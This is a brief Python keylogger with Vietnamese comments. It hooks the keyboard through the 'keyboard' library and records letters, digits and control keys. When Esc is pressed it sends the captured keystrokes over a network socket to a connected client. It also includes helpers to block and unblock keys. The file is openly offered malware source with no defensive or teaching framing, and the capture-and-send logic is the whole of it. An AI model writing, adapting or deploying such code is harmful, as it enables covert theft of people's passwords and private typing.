import keyboard

keys = []

def block_all_keys():
    """Khóa tất cả các phím trong danh sách."""
    for key in normal_keys:
        keyboard.block_key(key)
        
def unblock_all_keys():
    """Mở khóa tất cả các phím bằng cách bỏ hết hook."""
    keyboard.unhook_all()  # Gỡ bỏ tất cả các hook, mở khóa mọi phí

def start_keylogger(client_socket):
    """Bắt đầu keylogger và ghi lại các phím nhấn."""    

    def on_key_event(event):
        if event.name == 'esc':  # Nếu phím Esc được nhấn, dừng keylogger
            keyboard.unhook_all()  # Hủy bỏ tất cả các hook
            unblock_all_keys()  # Mở khóa tất cả các phím
            print("Keylogger stopped.")
            # Gửi các phím đã ghi lại về client khi keylogger dừng lại
            if keys:
                client_socket.sendall(" ".join(keys).encode())
            return False  # Dừng lắng nghe sự kiện
        if event.name in normal_keys:  # Chỉ thêm các phím hợp lệ
            keys.append(event.name)

    # Thiết lập hook để bắt các phím
    keyboard.hook(on_key_event)
    print("Keylogger is running. Press 'Esc' to stop.")
    keyboard.wait('esc')  # Chờ cho đến khi có sự kiện Esc được nhấn

# Đặt danh sách các phím hợp lệ
normal_keys = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
    'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'space', 'enter', 'tab', 'backspace', 'shift',
    'ctrl', 'alt', 'esc', 'capslock', 'numlock',
    'left', 'right', 'up', 'down', 'home', 'end',
    'page up', 'page down', 'insert', 'delete'
]
